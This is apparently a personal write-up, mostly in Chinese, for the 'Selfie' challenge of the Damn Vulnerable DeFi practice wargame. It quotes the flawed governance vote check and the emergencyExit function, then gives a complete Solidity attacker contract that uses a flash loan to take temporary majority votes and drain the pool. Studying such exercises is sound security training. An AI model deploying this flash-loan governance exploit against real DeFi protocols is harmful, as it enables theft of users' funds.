# Selfie

A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million at risk.

Rescue all funds from the pool and deposit them into the designated recovery account.

一个新的借贷池已经启动！它现在提供DVT代币的闪贷。它甚至包括一个复杂的治理机制来控制它。

会出什么问题，对吧？

你开始时没有任何 DVT 代币余额，而池中有 150 万个代币面临风险。

从池中取出所有资金，存入指定的回收账户。

## 漏洞代码

pool中的emergencyExit函数
```solidity
//只有SimpleGovernance合约可以调用此函数
    //@audit-info 我们是否能利用这个函数来提取资金？
    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit EmergencyExit(receiver, amount);
    }
```
和governance中的_hasEnoughVotes函数
```solidity
// @audit-issue 这是一个破碎的治理机制。只有当用户手持股份超过50%才能通过
    function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _votingToken.getVotes(who);
        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
        return balance > halfTotalSupply;
    }
```
这两个函数结合起来，允许攻击者通过闪电贷获取足够的投票权来排队一个紧急退出操作，从而将池中的资金转移到他们自己的账户中。

## 攻击代码
```solidity
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    address recovery;
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes token;
    uint256 actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _pool, address _governance, address _token, address _recovery) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
        recovery = _recovery;
    }

    function startAttack() external {
        // Initiate the flash loan
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000 ether, "");
    }

    function onFlashLoan(
        address _initiator,
        address,
        /*_token*/
        uint256 _amount,
        uint256 _fee,
        bytes calldata /*_data*/
    )
        external
        returns (bytes32)
    {
        require(msg.sender == address(pool), "SelfieAttacker: Only pool can call");
        require(_initiator == address(this), "SelfieAttacker: Initiator is not self");

        console.log("balance", token.balanceOf(address(this)));

        // 将投票委托给我们自己，这样我们就可以将一个动作排队
        token.delegate(address(this));
        uint256 _actionId =
            governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", recovery));

        actionId = _actionId;
        token.approve(address(pool), _amount + _fee);
        return CALLBACK_SUCCESS;
    }

    function executeProposal() external {
        governance.executeAction(actionId);
    }
}
```
编写一个合约，从pool中借出一般的资金并将股票委托给我们自己，从而允许我们排队一个紧急退出操作。

然后我们执行该操作以将资金转移到recovery中。

（写给我自己：以后要写onFlashLoan函数请来参考这里）